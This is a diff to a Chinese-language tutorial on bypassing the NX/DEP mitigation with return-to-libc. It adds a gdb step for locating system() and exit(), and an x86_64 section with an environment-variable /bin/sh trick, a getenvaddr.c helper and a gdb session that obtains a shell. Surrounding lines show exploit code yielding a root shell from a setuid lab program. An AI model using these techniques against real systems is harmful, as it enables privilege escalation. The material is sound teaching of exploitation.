@@ -13,7 +13,7 @@ VM Setup: Ubuntu 12.04 (x86)
 
 ## 什么是NX比特位
 
-这种漏洞利用缓解方法将指定内存区域设置为不可执行，并将可执行的区域设置为不可写。举个例子：数据段、栈和堆设置为不可执行，text段设置为不可写。  
+这种漏洞利用缓解方法将指定内存区域设置为不可执行，并将可执行的区域设置为不可写。举个例子：数据段、栈和堆设置为不可执行，text段设置为不可写（数据执行保护策略(DEP)）。  
 
 设置NX位后，经典的栈缓冲区溢出无法利用其漏洞。那是因为，在经典的方法中，shellcode被拷贝到栈中，返回地址指向shellcode。然而，现在的情况是栈被设置位不可执行，漏洞利用(exploit)就会失败。 当然，这种缓解(mitigation)技术也不是完全安全的，这篇文章就来看看我们是如何绕过NX比特位的!!!  
 
@@ -95,6 +95,7 @@ buf += conv(system_arg)
 print "Calling vulnerable program"
 call(["./vuln", buf])
 ```
+gdb调试程序，在main出设置断点并运行，程序会在main的入口处停下，然后执行p system 和 p exit 就能将system和exit在内存中的地址打印出来。  
 执行上述漏洞利用代码，可以得到一个具有root权限的shell,如下图所示：  
 
 ``` bash
@@ -107,6 +108,43 @@ uid=1000(sploitfun) gid=1000(sploitfun) euid=0(root) egid=0(root) groups=0(root)
 $
 ```
 太棒了，我们拿到了root shell! 但在实际应用程序中，root setuid 程序设置了最低权限准则，获取root shell并没那么容易！  
+
+## x86_64 平台攻击实验
+对于本地攻击，我们可以将“/bin/sh”声明为一个环境变量，这样，retlib运行时就能找到这个字符串的首地址。具体步骤如下：  
+```
+export MYSHELL=/bin/sh
+gcc –o getenvaddr getenvaddr.c
+./getenvaddr MYSHELL ./retlib
+```
+其中 getenvaddr.c 的代码如下  
+``` c
+int main(int argc, char **argv)
+{
+	char *env=0;
+	if(argc < 3){
+		printf(“Usage: %s<environment var> <target program
+		name>\n”, argv[0]); return 1;
+	}
+	env=getenv(argv[1]);
+	env += (strlen(argv[0]) - strlen(argv[2])) * 2;
+	printf(“%s will be at %p\n”, argv[1], env); return 0;
+}
+```
+
+在 x86_64 平台的实验采用了与 x86 平台类似的方式。我们为假 system()函数构造了一个假的栈帧内容，并让其执行特定的命令“/bin/sh”，但攻击并没有成功。这是因为在 x86_64 的 CPU 平台中程序执行时参数不是通过栈传递的而是通过寄存器，而 return-into-libc 需要将参数通过栈来传递。因此 system()函数始终不能获得正确的参数。为了验证这一点，我们通过 gdb 跟踪进入 system()后的过程。
+```
+$gdb retlibc
+......
+(gdb)p/x $rdi
+$1=0x7fffffffe012
+(gdb)set $rdi=0x7fffffffeddf
+(gdb)c
+continuing.
+$pwd
+/home/fmliu/paper
+$
+```
+system()函数通过 rdi 寄存器获得参数“/bin/sh”的地址，因此在 gdb 中我们重新设定 rdi 寄存器的值为字符串地址后，攻击就可以实施了。因此，说明攻击确实是仅仅因为参数通过寄存器而非栈传递而导致了失败。  
 
 ## 什么是最低权限准则
 
